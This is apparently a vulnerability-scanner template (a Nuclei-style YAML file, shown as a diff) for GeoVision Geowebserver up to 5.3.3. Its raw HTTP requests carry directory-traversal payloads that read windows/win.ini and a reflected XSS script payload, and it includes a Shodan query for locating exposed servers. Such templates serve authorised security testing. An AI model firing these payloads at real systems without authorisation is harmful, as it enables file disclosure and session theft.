@@ -1,0 +1,50 @@
+id: geovision-geowebserver-lfi-xss
+
+info:
+  name: GeoVision Geowebserver <= 5.3.3 - Local File Inclusion / Cross-Site Scripting
+  author: shamo0
+  severity: high
+  description: |
+    GEOVISION GEOWEBSERVER <= 5.3.3 is vulnerable to several XSS, HTML Injection, and Local File Include (LFI) vectors. The application fails to properly sanitize user requests, allowing injection of HTML code and XSS, as well as client-side exploitation, including session theft.
+  reference:
+    - https://www.geovision.com.tw/cyber_security.php
+    - https://www.exploit-db.com/exploits/50211
+  metadata:
+    verified: true
+    max-request: 3
+    shodan-query: title:"Geowebserver"
+  tags: geovision,geowebserver,lfi,xss,vuln
+
+http:
+  - raw:
+      - |
+        GET /Visitor/bin/WebStrings.srf?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&obj_name=<script>alert(document.domain)</script> HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /Visitor/bin/WebStrings.srf?obj_name=win.ini HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 0
+
+      - |
+        GET /Visitor//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows\win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: lfi
+        dsl:
+          - 'contains_all(body, "for 16-bit", "[fonts]", "[extensions]")'
+          - 'contains(content_type, "application/octet-stream")'
+          - 'status_code == 200'
+        condition: and
+
+      - type: dsl
+        name: xss
+        dsl:
+          - 'contains_all(body, "<script>alert(document.domain)</script>={\"AeDebug")'
+          - 'contains(content_type, "text/html")'
+          - 'status_code == 200'
+        condition: and
+# digest: 490a00463044022020ad3653f923880376096998434a9d3e9d8d0ef05955c8df2091dd7d177c1545022054651a6e91dbbc85bd62cfe4c1055cc8c3ee332e3bc6db41e506be82b159f4dc:922c64590222798bb761d5b6d8e72950
